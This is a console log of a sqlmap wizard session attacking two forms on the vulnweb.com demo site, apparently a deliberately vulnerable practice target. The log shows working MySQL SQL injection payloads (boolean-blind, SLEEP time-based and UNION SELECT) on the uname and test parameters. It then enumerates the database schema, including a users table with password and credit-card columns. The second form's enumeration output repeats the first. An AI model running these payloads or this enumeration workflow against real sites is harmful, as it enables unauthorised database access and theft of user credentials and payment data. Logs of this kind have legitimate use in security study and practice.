        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.2.2.10#dev}
|_ -| . ["]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 22:14:08

[22:14:08] [INFO] starting wizard interface

POST data (--data) [Enter for None]: [22:14:08] [WARNING] no GET and/or POST parameter(s) found for testing (e.g. GET parameter 'id' in 'http://www.site.com/vuln.php?id=1'). Will search for forms

Injection difficulty (--level/--risk). Please choose:
[1] Normal (default)
[2] Medium
[3] Hard
> 
Enumeration (--banner/--current-user/etc). Please choose:
[1] Basic (default)
[2] Intermediate
[3] All
> 
sqlmap is running, please wait..


[#1] form:
POST http://testphp.vulnweb.com:80/userinfo.php
POST data: uname=&pass=
do you want to test this form? [Y/n/q] 
> Y

Edit POST data [default: uname=&pass=] (Warning: blank fields detected): uname=&pass=

do you want to fill blank fields with random values? [Y/n] Y

sqlmap got a 302 redirect to 'http://testphp.vulnweb.com:80/login.php'. Do you want to follow? [Y/n] Y

redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: uname (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: uname=-5416' OR 8396=8396#&pass=

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 OR time-based blind
    Payload: uname=CNeL' OR SLEEP(5)-- kLki&pass=

    Type: UNION query
    Title: MySQL UNION query (NULL) - 8 columns
    Payload: uname=CNeL' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7162766b71,0x5068634e766e6a49747672614f6d5a6e4677564a44436e4846716a6a6766795a4570516f67676957,0x7170767671),NULL#&pass=
---

do you want to exploit this SQL injection? [Y/n] Y
web application technology: Nginx, PHP 5.3.10
back-end DBMS operating system: Linux Ubuntu
back-end DBMS: MySQL >= 5.0.12
banner:    '5.1.73-0ubuntu0.10.04.1'
current user:    'acuart@localhost'
current database:    'acuart'
current user is DBA:    False
database management system users [1]:
[*] 'acuart'@'localhost'

available databases [2]:
[*] acuart
[*] information_schema

Database: acuart
[8 tables]
+-----------+
| artists   |
| carts     |
| categ     |
| featured  |
| guestbook |
| pictures  |
| products  |
| users     |
+-----------+

Database: acuart
Table: categ
[3 columns]
+--------+-------------+
| Column | Type        |
+--------+-------------+
| cat_id | int(5)      |
| cdesc  | tinytext    |
| cname  | varchar(50) |
+--------+-------------+

Database: acuart
Table: users
[8 columns]
+---------+--------------+
| Column  | Type         |
+---------+--------------+
| address | mediumtext   |
| cart    | varchar(100) |
| cc      | varchar(100) |
| email   | varchar(100) |
| name    | varchar(100) |
| pass    | varchar(100) |
| phone   | varchar(100) |
| uname   | varchar(100) |
+---------+--------------+

Database: acuart
Table: carts
[3 columns]
+---------+--------------+
| Column  | Type         |
+---------+--------------+
| cart_id | varchar(100) |
| item    | int(11)      |
| price   | int(11)      |
+---------+--------------+

Database: acuart
Table: pictures
[8 columns]
+--------+--------------+
| Column | Type         |
+--------+--------------+
| a_id   | int(11)      |
| cat_id | int(11)      |
| img    | varchar(50)  |
| pic_id | int(5)       |
| plong  | text         |
| price  | int(11)      |
| pshort | mediumtext   |
| title  | varchar(100) |
+--------+--------------+

Database: acuart
Table: featured
[2 columns]
+--------------+---------+
| Column       | Type    |
+--------------+---------+
| feature_text | text    |
| pic_id       | int(11) |
+--------------+---------+

Database: acuart
Table: products
[5 columns]
+-------------+------------------+
| Column      | Type             |
+-------------+------------------+
| description | text             |
| id          | int(10) unsigned |
| name        | text             |
| price       | int(10) unsigned |
| rewritename | text             |
+-------------+------------------+

Database: acuart
Table: artists
[3 columns]
+-----------+-------------+
| Column    | Type        |
+-----------+-------------+
| adesc     | text        |
| aname     | varchar(50) |
| artist_id | int(5)      |
+-----------+-------------+

Database: acuart
Table: guestbook
[3 columns]
+----------+--------------+
| Column   | Type         |
+----------+--------------+
| mesaj    | text         |
| sender   | varchar(150) |
| senttime | int(32)      |
+----------+--------------+


[#2] form:
POST http://testphp.vulnweb.com:80/search.php?test=query
POST data: searchFor=&goButton=go
do you want to test this form? [Y/n/q] 
> Y

Edit POST data [default: searchFor=&goButton=go] (Warning: blank fields detected): searchFor=&goButton=go

do you want to fill blank fields with random values? [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: test (GET)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: test=query' RLIKE (SELECT (CASE WHEN (3191=3191) THEN 0x7175657279 ELSE 0x28 END))-- TwxK

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: test=query' AND (SELECT * FROM (SELECT(SLEEP(5)))PbRt)-- eAUl

    Type: UNION query
    Title: MySQL UNION query (NULL) - 3 columns
    Payload: test=query' UNION ALL SELECT NULL,CONCAT(0x717a787671,0x476c46727874446154645a5769474c55684c73667a4655505175786a5074646a7767796a6446456f,0x7170717171),NULL#
---

do you want to exploit this SQL injection? [Y/n] Y
web application technology: Nginx, PHP 5.3.10
back-end DBMS operating system: Linux Ubuntu
back-end DBMS: MySQL >= 5.0.12
banner:    '5.1.73-0ubuntu0.10.04.1'
current user:    'acuart@localhost'
current database:    'acuart'
current user is DBA:    False
database management system users [1]:
[*] 'acuart'@'localhost'

available databases [2]:
[*] acuart
[*] information_schema

Database: acuart
[8 tables]
+-----------+
| artists   |
| carts     |
| categ     |
| featured  |
| guestbook |
| pictures  |
| products  |
| users     |
+-----------+

Database: acuart
Table: categ
[3 columns]
+--------+-------------+
| Column | Type        |
+--------+-------------+
| cat_id | int(5)      |
| cdesc  | tinytext    |
| cname  | varchar(50) |
+--------+-------------+

Database: acuart
Table: users
[8 columns]
+---------+--------------+
| Column  | Type         |
+---------+--------------+
| address | mediumtext   |
| cart    | varchar(100) |
| cc      | varchar(100) |
| email   | varchar(100) |
| name    | varchar(100) |
| pass    | varchar(100) |
| phone   | varchar(100) |
| uname   | varchar(100) |
+---------+--------------+

Database: acuart
Table: carts
[3 columns]
+---------+--------------+
| Column  | Type         |
+---------+--------------+
| cart_id | varchar(100) |
| item    | int(11)      |
| price   | int(11)      |
+---------+--------------+

Database: acuart
Table: pictures
[8 columns]
+--------+--------------+
| Column | Type         |
+--------+--------------+
| a_id   | int(11)      |
| cat_id | int(11)      |
| img    | varchar(50)  |
| pic_id | int(5)       |
| plong  | text         |
| price  | int(11)      |
| pshort | mediumtext   |
| title  | varchar(100) |
+--------+--------------+

Database: acuart
Table: featured
[2 columns]
+--------------+---------+
| Column       | Type    |
+--------------+---------+
| feature_text | text    |
| pic_id       | int(11) |
+--------------+---------+

Database: acuart
Table: products
[5 columns]
+-------------+------------------+
| Column      | Type             |
+-------------+------------------+
| description | text             |
| id          | int(10) unsigned |
| name        | text             |
| price       | int(10) unsigned |
| rewritename | text             |
+-------------+------------------+

Database: acuart
Table: artists
[3 columns]
+-----------+-------------+
| Column    | Type        |
+-----------+-------------+
| adesc     | text        |
| aname     | varchar(50) |
| artist_id | int(5)      |
+-----------+-------------+

Database: acuart
Table: guestbook
[3 columns]
+----------+--------------+
| Column   | Type         |
+----------+--------------+
| mesaj    | text         |
| sender   | varchar(150) |
| senttime | int(32)      |
+----------+--------------+


[*] shutting down at 22:14:16

